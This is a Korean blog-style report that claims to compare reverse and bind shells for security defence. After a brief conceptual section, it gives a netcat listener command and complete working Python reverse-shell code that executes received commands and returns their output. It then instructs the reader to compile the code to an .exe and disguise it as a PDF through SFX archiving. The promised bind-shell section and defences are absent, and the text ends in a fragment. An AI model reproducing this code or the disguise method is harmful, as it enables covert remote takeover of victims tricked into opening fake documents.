# 리버스 쉘과 바인딩 쉘의 차이점 분석

## 1. 개요
보안 관제 및 해킹 방어 연구에서 **원격 제어(Remote Control)** 기법은 중요한 개념입니다. 이 중 **리버스 쉘(Reverse Shell)** 과 **바인딩 쉘(Binding Shell)** 은 공격자가 원격으로 시스템을 제어할 때 자주 사용되는 기법입니다. 본 보고서에서는 두 기법의 개념과 차이점을 분석하고, 보안적 대응 방안을 제시합니다.

## 2. 리버스 쉘(Reverse Shell)

### 2.1 개념
리버스 쉘은 **공격자가 제어하는 시스템(공격자 PC)** 에서 대기하고 있다가 **피해자의 시스템에서 공격자에게 연결을 요청하는 방식**입니다. 즉, 피해 시스템이 공격자의 시스템으로 **역으로 접속(reverse connection)** 하는 형태입니다.

### 2.2 동작 방식
1. 공격자가 원격에서 **서버 역할(Listener, 리스너)** 을 수행하며 대기
2. 피해 시스템이 공격자 시스템으로 **연결 요청을 전송**
3. 연결이 성공하면 공격자는 피해 시스템에서 명령을 실행할 수 있음

### 2.3 장점
- **방화벽 우회 가능**: 일반적으로 아웃바운드(Outbound) 트래픽은 방화벽에서 차단되지 않기 때문에 내부 네트워크에서도 실행 가능
- **공격자의 위치가 익명화됨**: 피해 시스템이 먼저 연결하므로 공격자의 IP가 쉽게 노출되지 않음

### 2.4 단점
- **피해 시스템이 아웃바운드 트래픽 차단 정책을 사용할 경우 실행 불가**
- **공격자가 연결을 수락할 준비가 되어 있어야 함**

### 2.5 활용 예시 (Netcat 이용)
공격자(리스너 설정):
```bash
nc -lvnp 4444

```python
import socket
import subprocess

def connect(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        return s
    except Exception as e:
        print("[-] Connection failed:", e)
        return None

def main():
    ip = ''  # 공격자의 IP 주소를 입력하세요
    port =   # 공격자의 포트 번호를 입력하세요
    s = connect(ip, port)
    if s:
        while True:
            command = s.recv(1024).decode()
            if 'exit' in command.lower():
                s.close()
                break
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                s.sendall(output)
            except Exception as e:
                s.sendall(str(e).encode())
                pass

if __name__ == "__main__":
    main()

```
pip를 이용하여 pyinstaller로 .py 파일을 .exe 파일로 만들어줍니다.

우리는 이제 sfx 압축을 통해 위 파이썬 실행파일을 일반적인 pdf파일로 위장해야됩니다.

웹쉘 업로드, 리버스 쉘, 바인딩 쉘 차이점 
